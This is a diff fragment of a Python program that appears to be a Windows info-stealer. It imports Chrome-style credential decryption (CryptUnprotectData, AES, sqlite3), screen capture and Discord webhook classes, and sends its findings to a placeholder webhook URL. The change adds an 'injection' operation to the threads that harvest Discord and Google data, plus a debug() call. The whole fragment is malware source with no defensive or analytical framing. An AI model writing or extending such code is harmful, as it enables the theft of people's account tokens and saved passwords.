@@ -2,26 +2,30 @@ import base64
 import ctypes
 import json
 import os
-from random import SystemRandom
 import re
 import shutil
 import sqlite3
 import subprocess
-from asyncio import subprocess
+import sys
+import uuid
+from threading import Thread
 
+import psutil
 import requests
 import wmi
 from Crypto.Cipher import AES
 from discord import Embed, File, RequestsWebhookAdapter, Webhook
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
-from threading import Thread
+
 
 def main() -> None:
+    debug()
+    
     webhook = "&WEBHOOK_URL&"
     
     threads = []
-    for operation in [discord, google]:
+    for operation in [discord, google, injection,]:
         thread = Thread(target=operation, args=(webhook,))
         thread.start()
         threads.append(thread)
